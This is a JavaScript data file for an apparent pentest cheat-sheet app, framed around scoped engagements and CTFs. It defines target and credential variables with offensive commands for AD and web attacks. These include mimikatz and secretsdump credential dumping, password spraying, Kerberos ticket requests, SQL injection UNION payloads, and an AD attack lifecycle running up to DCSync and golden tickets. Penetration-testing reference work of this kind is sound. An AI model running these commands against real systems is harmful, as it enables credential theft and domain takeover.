/* ─── Variables ──────────────────────────────────────────────────────────────── */
const VARIABLES = {
  '$$IP': {
    name: '$$IP',
    description: 'Target IP address',
    howToGet: [
      { method: 'From scope doc', notes: 'Provided in the engagement scope or briefing.' },
      { method: 'DNS lookup', command: 'nslookup $$DOMAIN', notes: 'Resolves the target domain to an IP.' },
      { method: 'Ping', command: 'ping $$DOMAIN', notes: 'Quick check if host is live and resolves.' },
    ],
  },
  '$$DOMAIN': {
    name: '$$DOMAIN',
    description: 'Target Active Directory domain (e.g. Muath.local)',
    howToGet: [
      { method: 'From scope doc', notes: 'Provided in the engagement scope.' },
      { method: 'Enumerate from host', command: 'systeminfo | findstr /B /C:"Domain"', notes: 'Run on a domain-joined host.' },
      { method: 'LDAP query', command: 'nltest /dclist:', notes: 'Lists domain controllers for the current domain.' },
    ],
  },
  '$$DC': {
    name: '$$DC',
    description: 'Domain controller IP or hostname',
    howToGet: [
      { method: 'nltest', command: 'nltest /dsgetdc:$$DOMAIN', notes: 'Returns the DC for the domain.' },
      { method: 'nslookup SRV', command: 'nslookup -type=SRV _ldap._tcp.$$DOMAIN', notes: 'DNS SRV record for LDAP.' },
      { method: 'nmap', command: 'nmap -p 88 $$IP/24 --open', notes: 'Kerberos port 88 indicates a DC.' },
    ],
  },
  '$$USER': {
    name: '$$USER',
    description: 'Target username (plain text)',
    howToGet: [
      { method: 'LDAP enumeration', command: 'ldapsearch -x -H ldap://$$DC -b "DC=$$DOMAIN" "(objectClass=user)" sAMAccountName', notes: 'Requires anonymous or authenticated LDAP.' },
      { method: 'Kerbrute userenum', command: 'kerbrute userenum --dc $$DC -d $$DOMAIN users.txt', notes: 'Fast Kerberos-based user enumeration.' },
      { method: 'enum4linux', command: 'enum4linux -U $$IP', notes: 'SMB/RPC user enumeration.' },
    ],
  },
  '$$PASSWORD': {
    name: '$$PASSWORD',
    description: 'Target plaintext password',
    howToGet: [
      { method: 'Credential spray', command: 'crackmapexec smb $$IP -u $$USER -p passwords.txt', notes: 'Spray a password list against the target.' },
      { method: 'Crack from hash', command: 'hashcat -m 1000 $$HASH $$WORDLIST', notes: 'Crack NTLM hash offline.' },
      { method: 'Secretsdump', command: 'secretsdump.py $$DOMAIN/$$USER:$$PASSWORD@$$DC', notes: 'Dump creds after gaining initial foothold.' },
    ],
  },
  '$$HASH': {
    name: '$$HASH',
    description: 'NTLM hash (LM:NT format)',
    howToGet: [
      { method: 'Mimikatz sekurlsa', command: 'mimikatz # sekurlsa::logonpasswords', notes: 'Dumps LSASS; requires SeDebugPrivilege.' },
      { method: 'Secretsdump (remote)', command: 'secretsdump.py $$DOMAIN/$$USER:$$PASSWORD@$$IP', notes: 'Remote SAM/NTDS dump via SMB.' },
      { method: 'Mimikatz lsadump', command: 'mimikatz # lsadump::sam', notes: 'Local SAM dump; requires local admin.' },
    ],
  },
  '$$LHOST': {
    name: '$$LHOST',
    description: 'Attacker/listener IP address',
    howToGet: [
      { method: 'ifconfig / ip a', command: 'ip a show tun0', notes: 'tun0 is typically your VPN interface on HTB/CTFs.' },
      { method: 'Windows', command: 'ipconfig', notes: 'Check your active network adapter.' },
    ],
  },
  '$$LPORT': {
    name: '$$LPORT',
    description: 'Local listener port on attacker machine',
    howToGet: [
      { method: 'Choose a free port', notes: 'Pick any unused port, e.g. 4444, 9001, 1337.' },
      { method: 'Check used ports', command: 'ss -tlnp', notes: 'Ensure the port is not already in use.' },
    ],
  },
  '$$PORT': {
    name: '$$PORT',
    description: 'Target service port when not running on standard port (e.g. 8080, 8443, 30525)',
    howToGet: [
      { method: 'nmap service scan', command: 'nmap -sV -sC -T4 $$IP', notes: 'Identifies all open ports and the services running on them.' },
      { method: 'From scope / challenge info', notes: 'Often given directly (e.g. HTB machine description, VHost port).' },
    ],
  },
  '$$SID': {
    name: '$$SID',
    description: 'Domain SID (Security Identifier)',
    howToGet: [
      { method: 'wmic', command: 'wmic useraccount where name="$$USER" get sid', notes: 'Get SID for a specific user on Windows.' },
      { method: 'PowerShell', command: 'Get-ADDomain | Select-Object DomainSID', notes: 'Get domain SID from AD module.' },
      { method: 'lookupsid.py', command: 'lookupsid.py $$DOMAIN/$$USER:$$PASSWORD@$$DC', notes: 'Enumerate SIDs via RPC.' },
    ],
  },
  '$$SHARE': {
    name: '$$SHARE',
    description: 'SMB share name on the target',
    howToGet: [
      { method: 'CrackMapExec', command: 'crackmapexec smb $$IP -u $$USER -p $$PASSWORD --shares', notes: 'Lists available SMB shares.' },
      { method: 'smbclient -L', command: 'smbclient -L //$$IP/ -U $$USER%$$PASSWORD', notes: 'Lists shares via SMB.' },
    ],
  },
  '$$TICKET': {
    name: '$$TICKET',
    description: 'Path to a Kerberos ticket (.ccache or .kirbi)',
    howToGet: [
      { method: 'getTGT.py', command: 'getTGT.py $$DOMAIN/$$USER:$$PASSWORD', notes: 'Request a TGT using credentials.' },
      { method: 'Pass-the-hash TGT', command: 'getTGT.py $$DOMAIN/$$USER -hashes :$$HASH', notes: 'Request TGT using NTLM hash.' },
      { method: 'Rubeus asktgt', command: 'Rubeus.exe asktgt /user:$$USER /password:$$PASSWORD /domain:$$DOMAIN /ptt', notes: 'Windows-side TGT request and injection.' },
    ],
  },

  /* ── Web / SQLi variables ───────────────────────────────────────────────── */
  '$$VULN_URL': {
    name: '$$VULN_URL',
    description: 'Full URL of the vulnerable endpoint (e.g. http://10.10.10.5/page.php?id=1)',
    howToGet: [
      { method: 'Browser address bar', notes: 'Navigate to the page and copy the full URL including GET parameters.' },
      { method: 'Burp Suite', notes: 'Intercept request → right-click → Copy URL. For POST, record the URL separately.' },
      { method: 'DevTools Network tab', notes: 'Click the request → Headers tab → Request URL.' },
    ],
  },
  '$$VULN_PARAM': {
    name: '$$VULN_PARAM',
    description: 'Vulnerable HTTP parameter name (e.g. id, username, search)',
    howToGet: [
      { method: 'Manual probe', notes: "Inject ' into each parameter one at a time — SQL error or response change = injection point." },
      { method: 'Arjun discovery', command: 'arjun -u http://$$IP/page.php', notes: 'Finds hidden GET/POST parameters.' },
      { method: 'Burp Suite active scan', notes: 'Right-click request → Actively scan selected insertion points.' },
    ],
  },
  '$$DB_TYPE': {
    name: '$$DB_TYPE',
    description: 'Database engine (MySQL, MSSQL, PostgreSQL, Oracle, SQLite)',
    howToGet: [
      { method: 'Nmap version scan', command: 'nmap -sV -p 3306,1433,5432,1521 $$IP', notes: '3306=MySQL, 1433=MSSQL, 5432=PostgreSQL, 1521=Oracle.' },
      { method: 'HTTP error message', notes: '"You have an error in your SQL syntax" = MySQL. "Unclosed quotation mark" = MSSQL. "ERROR: syntax error at or near" = PostgreSQL.' },
      { method: 'sqlmap banner', command: "sqlmap -u '$$VULN_URL' --banner --batch", notes: 'Reads the DB version string via injection.' },
    ],
  },
  '$$DB_NAME': {
    name: '$$DB_NAME',
    description: 'Target database / schema name to extract from',
    howToGet: [
      { method: 'sqlmap current-db', command: "sqlmap -u '$$VULN_URL' --current-db --batch", notes: '' },
      { method: 'sqlmap list all DBs', command: "sqlmap -u '$$VULN_URL' --dbs --batch", notes: '' },
      { method: 'MySQL manual', command: "' UNION SELECT database(),NULL-- -", notes: 'Inject into the vulnerable parameter.' },
      { method: 'MSSQL manual', command: "' UNION SELECT DB_NAME(),NULL-- -", notes: '' },
      { method: 'PostgreSQL manual', command: "' UNION SELECT current_database(),NULL-- -", notes: '' },
    ],
  },
  '$$DB_TABLE': {
    name: '$$DB_TABLE',
    description: 'Target table name within $$DB_NAME',
    howToGet: [
      { method: 'sqlmap tables', command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME --tables --batch", notes: '' },
      { method: 'MySQL manual', command: "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -", notes: '' },
      { method: "MSSQL manual", command: "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'-- -", notes: "xtype='U' = user tables only." },
      { method: 'PostgreSQL manual', command: "' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'-- -", notes: '' },
    ],
  },
  '$$DB_COLUMN': {
    name: '$$DB_COLUMN',
    description: 'Target column name within $$DB_TABLE (e.g. password, token)',
    howToGet: [
      { method: 'sqlmap columns', command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE --columns --batch", notes: '' },
      { method: 'MySQL manual', command: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='$$DB_TABLE'-- -", notes: '' },
      { method: 'MSSQL manual', command: "' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('$$DB_TABLE')-- -", notes: '' },
      { method: 'PostgreSQL manual', command: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='$$DB_TABLE'-- -", notes: '' },
    ],
  },
  '$$DB_USER': {
    name: '$$DB_USER',
    description: 'Database service account / authenticated DB username',
    howToGet: [
      { method: 'sqlmap current-user', command: "sqlmap -u '$$VULN_URL' --current-user --batch", notes: '' },
      { method: 'MySQL manual', command: "' UNION SELECT user(),NULL-- -", notes: 'Returns user like root@localhost.' },
      { method: 'MSSQL manual', command: "' UNION SELECT SYSTEM_USER,NULL-- -", notes: '' },
      { method: 'PostgreSQL manual', command: "' UNION SELECT current_user,NULL-- -", notes: '' },
    ],
  },
  '$$WORDLIST': {
    name: '$$WORDLIST',
    description: 'Path to wordlist / dictionary file for brute-forcing and fuzzing',
    howToGet: [
      { method: 'rockyou (Kali built-in)', command: 'ls /usr/share/wordlists/rockyou.txt', notes: 'May be gzipped — run: gunzip /usr/share/wordlists/rockyou.txt.gz' },
      { method: 'SecLists passwords', command: 'ls /usr/share/seclists/Passwords/', notes: 'Install: sudo apt install seclists' },
      { method: 'SecLists web dirs', command: 'ls /usr/share/seclists/Discovery/Web-Content/', notes: 'raft-medium-directories.txt is a solid default for web fuzzing.' },
      { method: 'SecLists DNS', command: 'ls /usr/share/seclists/Discovery/DNS/', notes: 'subdomains-top1million-5000.txt for subdomain bruting.' },
    ],
  },
  '$$URL': {
    name: '$$URL',
    description: 'Target web URL including protocol (e.g. http://example.com or https://10.10.10.5)',
    howToGet: [
      { method: 'From scope doc', notes: 'Provided in the engagement scope.' },
      { method: 'Construct from IP', notes: 'http://$$IP or https://$$IP — check both HTTP and HTTPS.' },
      { method: 'Construct from domain', notes: 'http://$$DOMAIN — also try www.$$DOMAIN for different server responses.' },
    ],
  },

  /* ── Active Directory variables ─────────────────────────────────────────── */
  '$$TARGET_HOST': {
    name: '$$TARGET_HOST',
    description: 'Target host IP or hostname for lateral movement (not the DC)',
    howToGet: [
      { method: 'Find DA sessions', command: 'nxc smb $$IP/24 -u $$USER -H $$HASH --loggedon-users', notes: 'Sweep subnet — find hosts where a DA is currently logged on.' },
      { method: 'Find local admin reach', command: 'nxc smb $$IP/24 -u $$USER -H $$HASH --continue-on-success', notes: '"Pwn3d!" marks every host where your hash is local admin.' },
      { method: 'BloodHound', notes: 'Mark your user Owned → query "Find computers where Domain Admins have sessions".' },
    ],
  },
  '$$CHILD_DOMAIN': {
    name: '$$CHILD_DOMAIN',
    description: 'Child domain FQDN for cross-trust attacks (e.g. child.Muath.local)',
    howToGet: [
      { method: 'nltest', command: 'nltest /trusted_domains', notes: 'Lists all trusted domains including child domains.' },
      { method: 'nxc ldap', command: 'nxc ldap $$DC -u $$USER -p $$PASSWORD --trusted-for-delegation', notes: 'Enumerate trust relationships via LDAP.' },
      { method: 'BloodHound', notes: 'Enable "Show Cross-Domain Edges" to see trust relationships and child domains.' },
    ],
  },
  '$$CHILD_SID': {
    name: '$$CHILD_SID',
    description: 'Child domain SID for SID History / Golden Ticket cross-trust attacks',
    howToGet: [
      { method: 'lookupsid.py', command: 'lookupsid.py $$CHILD_DOMAIN/$$USER:$$PASSWORD@$$DC', notes: 'Enumerate SIDs of the child domain.' },
      { method: 'PowerShell (domain-joined)', command: 'Get-ADDomain -Identity $$CHILD_DOMAIN | Select-Object DomainSID', notes: 'Requires RSAT AD module on a domain-joined host.' },
      { method: 'impacket-getPac', command: 'impacket-getPac -targetUser Administrator $$CHILD_DOMAIN/$$USER:$$PASSWORD', notes: 'Extracts domain SID from Kerberos PAC.' },
    ],
  },
  '$$CA_NAME': {
    name: '$$CA_NAME',
    description: 'Certificate Authority name for ADCS attacks (e.g. CORP-CA)',
    howToGet: [
      { method: 'certipy find', command: 'certipy find -u $$USER@$$DOMAIN -p $$PASSWORD -dc-ip $$DC -stdout', notes: 'Lists all CAs in the domain. Save the CA name for cert requests.' },
      { method: 'nxc adcs', command: 'nxc ldap $$DC -u $$USER -p $$PASSWORD -M adcs', notes: 'Enumerate ADCS Certificate Authorities via LDAP.' },
      { method: 'certutil (Windows)', command: 'certutil -config - -ping', notes: 'Lists available CAs on a Windows host.' },
    ],
  },
  '$$ADCS_TEMPLATE': {
    name: '$$ADCS_TEMPLATE',
    description: 'Vulnerable ADCS certificate template name (e.g. UserAuthentication)',
    howToGet: [
      { method: 'certipy find vulnerable', command: 'certipy find -u $$USER@$$DOMAIN -p $$PASSWORD -dc-ip $$DC -vulnerable -stdout', notes: 'Shows only vulnerable templates with ESC classification (ESC1, ESC3, etc.).' },
      { method: 'Certify (Windows)', command: 'Certify.exe find /vulnerable', notes: 'Windows-side ADCS enum. Lists templates with misconfigs.' },
    ],
  },
  '$$GPO_GUID': {
    name: '$$GPO_GUID',
    description: 'Group Policy Object GUID for GPO abuse (e.g. {A1B2C3D4-...})',
    howToGet: [
      { method: 'nxc gpo_owners', command: 'nxc smb $$DC -u $$USER -p $$PASSWORD -M gpo_owners', notes: 'Find GPOs where the current user has write access.' },
      { method: 'PowerShell (domain-joined)', command: 'Get-GPO -All | Select-Object DisplayName,Id', notes: 'Lists all GPOs with their GUIDs. Check BloodHound for which ones you can modify.' },
      { method: 'BloodHound', notes: 'Look for GPO write edges from your user or groups. Click the GPO node to see its GUID.' },
    ],
  },
};

const KNOWN_VAR_NAMES = Object.keys(VARIABLES);

const VAR_GROUPS = [
  { name: 'Target',         vars: ['$$IP', '$$PORT', '$$DOMAIN', '$$DC', '$$TARGET_HOST', '$$SID', '$$SHARE', '$$CHILD_DOMAIN', '$$CHILD_SID'] },
  { name: 'Credentials',    vars: ['$$USER', '$$PASSWORD', '$$HASH', '$$TICKET'] },
  { name: 'Attacker',       vars: ['$$LHOST', '$$LPORT'] },
  { name: 'Active Directory', vars: ['$$CA_NAME', '$$ADCS_TEMPLATE', '$$GPO_GUID'] },
  { name: 'SQL Injection',  vars: ['$$VULN_URL', '$$VULN_PARAM', '$$DB_TYPE', '$$DB_NAME', '$$DB_TABLE', '$$DB_COLUMN', '$$DB_USER'] },
  { name: 'Tools',          vars: ['$$WORDLIST', '$$URL'] },
];

/* ─── Tag Filtering ──────────────────────────────────────────────────────────── */
const TACTIC_TAGS = {
  'recon':            ['Linux', 'Network', 'Web'],
  'basic-enum':       ['Windows'],
  'active-directory': ['Windows', 'Linux', 'Active Directory', 'Kerberos', 'Network'],
  'initial-access':   ['Windows', 'Linux', 'Active Directory', 'Kerberos'],
  'def-evasion':      ['Windows'],
  'execution':        ['Windows', 'Linux'],
  'privesc':          ['Windows', 'Linux'],
  'cred-access':      ['Windows', 'Kerberos'],
  'mssql':            ['Windows', 'Linux', 'Database'],
  'persistence':      ['Windows', 'Active Directory'],
  'post-exploit':     ['Windows', 'Linux'],
  'footprinting':     ['Linux', 'Network'],
  'web-recon':        ['Linux', 'Web'],
  'web-sqli':         ['Linux', 'Web', 'Database'],
  'web-xss':          ['Linux', 'Web'],
  'web-lfi':          ['Linux', 'Web'],
  'web-upload':       ['Linux', 'Web'],
  'web-ssrf':         ['Linux', 'Web'],
  'web-cmdi':         ['Linux', 'Web'],
  'web-auth':         ['Linux', 'Web'],
  'web-idor':         ['Linux', 'Web'],
  'web-xxe':          ['Linux', 'Web'],
  'sqlmap':           ['Linux', 'Web', 'Database'],
  'netexec':          ['Windows', 'Linux', 'Active Directory', 'Network'],
};

const ALL_FILTER_TAGS = ['Windows', 'Linux', 'Active Directory', 'Kerberos', 'Network', 'Web', 'Database'];

/* ─── Sidebar Groups ─────────────────────────────────────────────────────────── */
const TACTIC_GROUPS = [
  {
    id: 'group-methodologies',
    name: 'Methodologies',
    icon: '📚',
    tacticIds: ['methodologies'],
  },
  {
    id: 'group-recon',
    name: 'Reconnaissance',
    icon: '🔍',
    tacticIds: ['recon', 'footprinting'],
  },
  {
    id: 'group-web',
    name: 'Web Application',
    icon: '🌐',
    tacticIds: ['web-recon', 'web-sqli', 'web-xss', 'web-lfi', 'web-upload', 'web-ssrf', 'web-cmdi', 'web-auth', 'web-idor', 'web-xxe'],
  },
  {
    id: 'group-foothold',
    name: 'Initial Foothold',
    icon: '🚪',
    tacticIds: ['initial-access', 'def-evasion', 'execution'],
  },
  {
    id: 'group-privesc',
    name: 'Privilege Escalation',
    icon: '📈',
    tacticIds: ['privesc', 'cred-access'],
  },
  {
    id: 'group-ad',
    name: 'Active Directory',
    icon: '🏰',
    tacticIds: ['active-directory'],
  },
  {
    id: 'group-post',
    name: 'Post-Compromise',
    icon: '🏴',
    tacticIds: ['basic-enum', 'mssql', 'persistence', 'post-exploit', 'linux-privesc', 'windows-privesc'],
  },
  {
    id: 'group-sqlmap',
    name: 'sqlmap Tool',
    icon: '🗃️',
    tacticIds: ['sqlmap'],
  },
  {
    id: 'group-netexec',
    name: 'NetExec Tool',
    icon: '🖧',
    tacticIds: ['netexec'],
  },
];

/* ─── Tactics ────────────────────────────────────────────────────────────────── */
const TACTICS = [
  /* ── 0. Methodologies ───────────────────────────────────────────────────── */
  {
    id: 'methodologies',
    name: 'Methodologies',
    icon: '📚',
    techniques: [
      {
        id: 'ad-methodology',
        name: 'Active Directory',
        description: 'Full AD attack lifecycle from external recon to domain dominance.',
        tags: ['methodology', 'overview', 'active-directory'],
        theory: {
          intro: 'Active Directory is the backbone of most enterprise networks. A successful AD pentest follows a structured lifecycle: enumerate the domain, identify misconfigurations, escalate privileges, move laterally, and achieve domain dominance. Every phase feeds the next — loot from one step becomes the credential for the next.',
          phases: [
            {
              icon: '🌐',
              name: 'External Recon',
              description: 'Identify the target AD footprint from the outside before gaining any internal access.',
              items: ['DNS zone transfers / dnsdumpster', 'OSINT (LinkedIn, Hunter.io)', 'Email harvesting for usernames', 'Public-facing services: OWA, ADFS, VPN, RDP, MSSQL'],
            },
            {
              icon: '🚪',
              name: 'Initial Foothold',
              description: 'Gain an initial shell or credential on an internal machine to begin domain enumeration.',
              items: ['Password spraying on OWA / VPN / Kerberos', 'Phishing (macro, link, lnk file)', 'Exploit public-facing service (CVE)', 'LLMNR/NBT-NS poisoning with Responder', 'Physical access / rogue device'],
              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-recon' }, 3: { tacticId: 'active-directory', techId: 'ad-relay' } },
            },
            {
              icon: '🔍',
              name: 'Internal Recon',
              description: 'Map the domain — users, groups, computers, GPOs, ACLs, trusts, and attack paths.',
              items: ['BloodHound / SharpHound (attack path analysis)', 'PowerView / ldapdomaindump / ldapsearch', 'Port scan + SMB enumeration', 'Share enumeration (null sessions, spider)', 'Password policy (lockout threshold)'],
              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-domain-enum' }, 1: { tacticId: 'active-directory', techId: 'ad-domain-enum' }, 2: { tacticId: 'active-directory', techId: 'ad-recon' }, 3: { tacticId: 'active-directory', techId: 'ad-domain-enum' }, 4: { tacticId: 'active-directory', techId: 'ad-recon' } },
            },
            {
              icon: '🔑',
              name: 'Credential Attacks',
              description: 'Harvest valid credentials or hashes without touching LSASS.',
              items: ['AS-REP Roasting (no pre-auth accounts)', 'Kerberoasting (accounts with SPNs)', 'Password spraying (kerbrute, NetExec)', 'SMB relay / NTLM relay (ntlmrelayx)', 'LDAP signing check + relay', 'IPv6 DNS takeover (mitm6)'],
              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-recon' }, 1: { tacticId: 'active-directory', techId: 'ad-kerberoast-acl' }, 2: { tacticId: 'active-directory', techId: 'ad-recon' }, 3: { tacticId: 'active-directory', techId: 'ad-relay' }, 4: { tacticId: 'active-directory', techId: 'ad-relay' }, 5: { tacticId: 'active-directory', techId: 'ad-relay' } },
            },
            {
              icon: '⬆️',
              name: 'Privilege Escalation',
              description: 'Escalate from standard domain user to Domain Admin via misconfigurations.',
              items: ['ACL abuse (WriteDACL, GenericAll, ForceChangePassword, AddMember)', 'Unconstrained / Constrained / RBCD delegation', 'GPO abuse (write permissions on GPO)', 'AdminSDHolder persistence', 'Local PE on compromised host → SYSTEM → dump hashes', 'Certificate Services (ADCS ESC1-ESC8)'],
              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-kerberoast-acl' }, 1: { tacticId: 'active-directory', techId: 'ad-domain-privesc' }, 2: { tacticId: 'active-directory', techId: 'ad-domain-privesc' }, 3: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 4: { tacticId: 'active-directory', techId: 'ad-local-privesc' }, 5: { tacticId: 'active-directory', techId: 'ad-adcs' } },
            },
            {
              icon: '↔️',
              name: 'Lateral Movement',
              description: 'Move across hosts using stolen credentials, hashes, or Kerberos tickets.',
              items: ['Pass-the-Hash (NTLMv1/v2 hash)', 'Pass-the-Ticket (TGT/TGS)', 'Overpass-the-Hash (hash → TGT)', 'WinRM (evil-winrm)', 'WMI / PsExec / SMBExec / atexec', 'RDP with plaintext or restricted admin'],
              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-lateral' }, 1: { tacticId: 'active-directory', techId: 'ad-lateral' }, 2: { tacticId: 'active-directory', techId: 'ad-lateral' }, 3: { tacticId: 'active-directory', techId: 'ad-lateral' }, 4: { tacticId: 'active-directory', techId: 'ad-lateral' }, 5: { tacticId: 'active-directory', techId: 'ad-lateral' } },
            },
            {
              icon: '👑',
              name: 'Domain Dominance',
              description: 'Achieve full domain control — dump all hashes, forge tickets, maintain access.',
              items: ['DCSync (replicate hashes via DRS protocol)', 'Golden Ticket (forge TGT with krbtgt hash)', 'Silver Ticket (forge TGS with service hash)', 'Skeleton Key (patch LSASS on DC)', 'DSRM account abuse', 'AdminSDHolder ACL backdoor'],
              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 1: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 2: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 3: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 4: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 5: { tacticId: 'active-directory', techId: 'ad-dcsync' } },
            },
            {
              icon: '🌲',
              name: 'Forest & Trust Attacks',
              description: 'Pivot across domain and forest trust boundaries.',
              items: ['Extra SID / SID history injection', 'Trust ticket forgery (cross-domain TGT)', 'Foreign group membership abuse', 'ADCS cross-forest template abuse', 'Child-to-parent domain trust escalation'],
              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-cross-trust' }, 1: { tacticId: 'active-directory', techId: 'ad-cross-trust' }, 2: { tacticId: 'active-directory', techId: 'ad-cross-trust' }, 3: { tacticId: 'active-directory', techId: 'ad-adcs' }, 4: { tacticId: 'active-directory', techId: 'ad-cross-trust' } },
            }
          ],
          concepts: [
            {
              name: 'Kerberos Authentication',
              description: 'Primary AD authentication protocol. Uses tickets (TGT/TGS) — passwords never travel the network. Understanding this is key to roasting, delegation, and ticket forgery attacks.',
              flow: ['Client → AS-REQ', 'KDC → TGT (AS-REP)', 'Client → TGS-REQ', 'KDC → Service Ticket', 'Client → Service']
            },
            {
              name: 'NTLM Authentication',
              description: 'Legacy challenge-response protocol. Still used for local accounts, cross-domain, and fallback. Vulnerable to Pass-the-Hash, relay attacks, and offline cracking.',
              flow: ['Client → Negotiate', 'Server → Challenge (nonce)', 'Client → NTHash(challenge)', 'Server / DC → Validates']
            },
            {
              name: 'ACLs & DACLs',
              description: 'Every AD object has a DACL defining who can do what. Misconfigured ACLs are the most common privilege escalation path. BloodHound maps these automatically.',
              items: ['GenericAll → Full control over object', 'WriteDACL → Add any permission', 'WriteOwner → Take object ownership', 'GenericWrite → Write non-protected attributes', 'ForceChangePassword → Change password without knowing old', 'AddMember → Add users to a group']
            },
            {
              name: 'Kerberoasting',
              description: 'Any domain user can request a TGS for any account with an SPN. The ticket is encrypted with the account NTLM hash — crack it offline with hashcat.',
              flow: ['Find SPNs (GetUserSPNs)', 'Request TGS (no special rights)', 'Extract hash from ticket', 'Crack offline → plaintext password']
            },
            {
              name: 'AS-REP Roasting',
              description: 'Accounts with pre-authentication disabled return an AS-REP containing data encrypted with the account hash. No credentials needed to request.',
              flow: ['Find no-preauth accounts', 'AS-REQ without creds', 'Receive AS-REP with enc-timestamp', 'Crack offline with hashcat']
            },
            {
              name: 'Delegation',
              description: 'Allows a service to authenticate to other services on behalf of a user. Misconfigured delegation lets an attacker impersonate any user to any service.',
              items: ['Unconstrained → Service receives full TGT, can impersonate to ANY service', 'Constrained → S4U2Proxy, impersonate to specific services only', 'RBCD → Configured on the resource; attacker-controlled if they have write on computer object']
            },
            {
              name: 'DCSync',
              description: 'Simulates DC replication to dump all NTLM hashes from the domain. Requires DS-Replication-Get-Changes-All — granted to DAs, DCs, and any ACL with this right.',
              flow: ['Gain replication rights (or DA)', 'Call DRSGetNCChanges via impacket/mimikatz', 'Receive all hashes including krbtgt']
            },
            {
              name: 'Golden / Silver Tickets',
              description: 'Forged Kerberos tickets. Golden = forged TGT using krbtgt hash (any service, any user). Silver = forged TGS using service account hash (single service, no DC contact needed).',
              flow: ['Obtain krbtgt hash (DCSync/dump)', 'Forge TGT with mimikatz/impacket', 'Pass-the-Ticket', 'Authenticate as any user to any service']
            },
            {
              name: 'ADCS (Certificate Services)',
              description: 'AD Certificate Services misconfigurations (ESC1-ESC8) allow low-priv users to request certificates that authenticate as any user including Domain Admin.',
              items: ['ESC1: Enroll + SAN in request (cert as DA)', 'ESC4: Write template permissions', 'ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on CA', 'ESC8: NTLM relay to AD CS HTTP endpoint']
            }
          ],
          tools: [
            { name: 'BloodHound', purpose: 'Graph-based AD attack path analysis. Finds shortest path from any owned user to Domain Admin. Essential for identifying ACL abuse paths.', tags: ['enumeration', 'paths', 'ACLs', 'GUI'] },
            { name: 'SharpHound', purpose: 'Windows BloodHound data collector (.NET). Runs on the compromised host. Use -c All for full collection.', tags: ['collector', 'Windows'] },
            { name: 'bloodhound-python', purpose: 'Linux BloodHound collector via LDAP. No binary needed on target. Use --dns-tcp when DNS issues. Slower than SharpHound.', tags: ['collector', 'Linux', 'LDAP'] },
            { name: 'Impacket', purpose: 'Python AD/Windows toolkit. Core tools: GetUserSPNs, GetNPUsers, secretsdump, psexec, wmiexec, ntlmrelayx, ticketer, getST.', tags: ['credentials', 'execution', 'relay', 'Linux'] },
            { name: 'NetExec (nxc)', purpose: 'Successor to CrackMapExec. Multi-protocol (SMB/LDAP/WinRM/MSSQL/RDP). Password spraying, command execution, dump SAM/LSA/NTDS.', tags: ['spray', 'execution', 'enumeration', 'Linux'] },
            { name: 'Mimikatz', purpose: 'In-memory credential extraction from LSASS. Kerberos ticket manipulation. DCSync. Golden/Silver/Diamond ticket creation. Run as SYSTEM on target.', tags: ['credentials', 'tickets', 'DCSync', 'Windows'] },
            { name: 'Rubeus', purpose: 'C# Kerberos toolkit. Kerberoasting, AS-REP roasting, PTT, S4U delegation abuse, overpass-the-hash, monitor for TGTs.', tags: ['kerberos', 'roasting', 'tickets', 'Windows'] },
            { name: 'PowerView', purpose: 'PowerShell AD enumeration. Get-DomainUser, Get-DomainGroup, Get-ObjectAcl, Find-LocalAdminAccess, Invoke-ACLScanner.', tags: ['enumeration', 'ACLs', 'PowerShell'] },
            { name: 'ldapdomaindump', purpose: 'Dump entire AD via LDAP. Outputs HTML/JSON/CSV of users, groups, computers, GPOs, trusts. No agent on target needed.', tags: ['enumeration', 'LDAP', 'Linux'] },
            { name: 'Kerbrute', purpose: 'Fast user enumeration and password spraying via Kerberos pre-auth. Does not trigger standard logon failure logs.', tags: ['spray', 'user enum', 'Kerberos'] },
            { name: 'Responder', purpose: 'LLMNR/NBT-NS/MDNS/WPAD poisoner. Captures NTLMv2 hashes from broadcast name resolution. Pair with ntlmrelayx for relay.', tags: ['poisoning', 'relay', 'hashes'] },
            { name: 'krbrelayx', purpose: 'Exploit unconstrained delegation via DNS relay to capture TGTs of machines authenticating to a rogue service.', tags: ['delegation', 'relay', 'Kerberos'] },
            { name: 'Certipy', purpose: 'ADCS attack tool. Enumerate vulnerable templates, request certs for ESC1-ESC8, authenticate with certificates via PKINIT.', tags: ['ADCS', 'certificates', 'Linux'] },
            { name: 'Hashcat', purpose: 'GPU-accelerated offline hash cracking. Mode 13100 for Kerberoast, 18200 for AS-REP, 5600 for NTLMv2, 1000 for NTLM.', tags: ['cracking', 'offline'] }
          ]
        },
        subtechniques: []
      },
      /* ── Web Application Methodology ─────────────────────────────────── */
      {
        id: 'web-methodology',
        name: 'Web Application',
        description: 'Full web app pentest lifecycle from recon to post-exploitation.',
        tags: ['methodology', 'overview', 'web'],
        theory: {
          intro: 'Web application pentesting follows a structured lifecycle: map the attack surface, fingerprint technologies, test every input vector for injection, abuse authentication and access control flaws, then chain findings to demonstrate real impact. Every parameter, header, and endpoint is a potential vulnerability.',
          phases: [
            {
              icon: '🔍',
              name: 'Reconnaissance',
              description: 'Passive and active information gathering — enumerate subdomains, discover technologies, and map the attack surface before touching the app.',
              items: ['Subdomain Enumeration', 'DNS Recon', 'Google Dorking', 'OSINT / Hunter.io', 'Wayback Machine', 'Technology Fingerprinting'],
